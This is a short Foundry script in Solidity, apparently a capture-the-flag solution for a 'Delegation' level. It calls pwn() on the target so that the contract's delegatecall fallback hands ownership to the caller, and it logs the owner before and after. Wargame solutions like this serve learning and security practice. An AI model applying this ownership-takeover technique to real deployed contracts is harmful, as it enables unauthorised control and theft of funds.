// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console2.sol";

interface IDelegation {
    function owner() external returns (address);
    function pwn() external;
}

contract Lv6Solution is Script {
    function run(address delegationAddr) public {
        IDelegation lv6 = IDelegation(delegationAddr);

        console.log("Owner before exploit: ", lv6.owner());

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        lv6.pwn();
        vm.stopBroadcast();

        console.log("Owner after exploit: ", lv6.owner());
    }
}